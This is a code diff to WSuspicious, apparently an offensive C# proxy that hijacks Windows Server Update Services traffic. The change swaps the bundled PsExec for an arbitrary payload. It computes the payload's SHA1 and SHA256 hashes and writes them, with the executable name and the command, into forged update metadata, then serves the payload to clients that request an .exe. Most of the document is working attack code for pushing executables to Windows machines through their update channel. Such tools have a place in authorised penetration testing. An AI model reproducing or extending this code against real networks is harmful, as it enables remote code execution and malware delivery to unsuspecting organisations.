@@ -1,7 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.IO;
 using System.Net;
+using System.Security.Cryptography;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Xml;
@@ -21,6 +21,11 @@ namespace WSuspicious.Proxy
 
         private short flagStep = 0;
 
+        private readonly byte[] payload;
+        private readonly string payloadSHA1;
+        private readonly string payloadSHA256;
+        private readonly string payloadExecutableName;
+
         private readonly int updateID1;
         private readonly int updateID2;
         private readonly int deploymentID1;
@@ -31,23 +36,30 @@ namespace WSuspicious.Proxy
         private readonly bool isDebug;
         private readonly bool isHTTPS;
         private readonly string wsusHost;
-        private readonly string psExecPath;
 
         private readonly string executedCommand;
 
-        public WsusProxy(string wsusHost, bool isHTTPS, string psExecPath) : this(wsusHost, isHTTPS, psExecPath, "cmd /c \"echo 1 > C:\\mitmdump_poc.txt\"")
+        public WsusProxy(string wsusHost, bool isHTTPS, byte[] payload, string payloadExecutableName, string executedCommand) : this(wsusHost, isHTTPS, payload, payloadExecutableName, executedCommand, false)
         { }
 
-        public WsusProxy(string wsusHost, bool isHTTPS, string psExecPath, string executedCommand) : this(wsusHost, isHTTPS, psExecPath, executedCommand, false)
-        { }
-
-        public WsusProxy(string wsusHost, bool isHTTPS, string psExecPath, string executedCommand, bool debug)
+        public WsusProxy(string wsusHost, bool isHTTPS, byte[] payload, string payloadExecutableName, string executedCommand, bool debug)
         {
             this.isDebug = debug;
             this.isHTTPS = isHTTPS;
             this.wsusHost = wsusHost;
-            this.psExecPath = psExecPath;
+            this.payload = payload;
+            this.payloadExecutableName = payloadExecutableName;
             this.executedCommand = WebUtility.HtmlEncode(WebUtility.HtmlEncode(executedCommand));
+            
+            using (var cryptoProvider = new SHA1CryptoServiceProvider())
+            {
+                this.payloadSHA1 = Convert.ToBase64String(cryptoProvider.ComputeHash(payload));
+            }
+
+            using (var cryptoProvider = new SHA256CryptoServiceProvider())
+            {
+                this.payloadSHA256 = Convert.ToBase64String(cryptoProvider.ComputeHash(payload));
+            }
 
             // Generate our update IDs
             Random rnd = new Random();
@@ -200,7 +212,7 @@ namespace WSuspicious.Proxy
                 else if (e.HttpClient.Request.RequestUri.AbsoluteUri.Contains(".exe"))
                 {
                     // return file
-                    e.Ok(File.ReadAllBytes(psExecPath));
+                    e.Ok(payload);
                 }
             }
         }
@@ -269,7 +281,22 @@ namespace WSuspicious.Proxy
                     {
                         string payloadURL = "http://wsusisagoldmine:8530/Content/B2/FB0A150601470195C47B4E8D87FCB3F50292BEB2.exe";
                         string secondPhaseTemplate = WSuspicious.Properties.Resources.ExtendedUpdateInfoTemplate;
-                        secondPhaseTemplate = String.Format(secondPhaseTemplate, updateID2, executedCommand, updateID1, updateID1, updateID2, payloadURL);
+                        secondPhaseTemplate = String.Format(secondPhaseTemplate,
+                            updateID2,
+                            payload.Length,
+                            payload.Length,
+                            WebUtility.HtmlEncode(payloadSHA1),
+                            WebUtility.HtmlEncode(payloadExecutableName),
+                            payload.Length,
+                            WebUtility.HtmlEncode(payloadSHA256),
+                            executedCommand,
+                            WebUtility.HtmlEncode(payloadExecutableName),
+                            updateID1,
+                            updateID1,
+                            updateID2,
+                            payloadSHA1,
+                            payloadURL
+                        );
 
                         // TODO: I do not know if that works
                         if (e.HttpClient.Response.StatusCode == 500)
